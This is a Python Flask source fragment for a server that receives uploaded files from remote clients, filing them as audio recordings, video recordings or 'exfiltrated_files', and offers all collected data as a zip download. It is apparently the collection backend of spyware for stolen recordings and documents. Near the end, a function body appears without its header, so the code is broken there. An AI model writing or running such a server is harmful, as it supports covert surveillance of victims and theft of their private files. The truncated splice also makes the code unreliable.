@app.route('/receive_file', methods=['POST'])
def receive_file():
    """Endpoint for receiving files"""
    try:
        if 'file' not in request.files:
            return jsonify({'status': 'error', 'message': 'No file provided'}), 400
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({'status': 'error', 'message': 'No file selected'}), 400
        
        # Get file type from form data or filename
        file_type = request.form.get('type', 'file')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        safe_filename = file.filename.replace(' ', '_').replace(':', '_')
        filename = f"{timestamp}_{safe_filename}"
        
        if file_type == 'audio':
            filepath = os.path.join(DATA_DIR, 'audio', filename)
            duration = request.form.get('duration', 0)
            
            file.save(filepath)
            
            collected_data['audio_recordings'].append({
                'filename': filename,
                'duration': duration,
                'size': os.path.getsize(filepath),
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            })
            
        elif file_type == 'video':
            filepath = os.path.join(DATA_DIR, 'video', filename)
            file.save(filepath)
            
            collected_data['video_recordings'].append({
                'filename': filename,
                'size': os.path.getsize(filepath),
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            })
            
        else:
            filepath = os.path.join(DATA_DIR, 'files', filename)
            file.save(filepath)
            
            collected_data['exfiltrated_files'].append({
                'filename': filename,
                'original_name': file.filename,
                'size': os.path.getsize(filepath),
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            })
        
        save_all_data()
        logger.info(f"📁 File saved: {filename}")
        
        return jsonify({'status': 'success', 'filename': filename})
        
    except Exception as e:
        logger.error(f"❌ Error in receive_file: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/download_all')
def download_all():
    """Download all data as zip"""
    import zipfile
    from io import BytesIO
    
    memory_file = BytesIO()
    with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
        for root, dirs, files in os.walk(DATA_DIR):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, DATA_DIR)
                zf.write(file_path, arcname)
    
    memory_file.seek(0)
    return memory_file.getvalue(), 200, {
        'Content-Type': 'application/zip',
        'Content-Disposition': 'attachment; filename=collected_data.zip'
    }

                    os.remove(file_path)
            except:
                pass
    
    collected_data.clear()
    save_all_data()
    return jsonify({'status': 'success', 'message': 'Data cleared'})
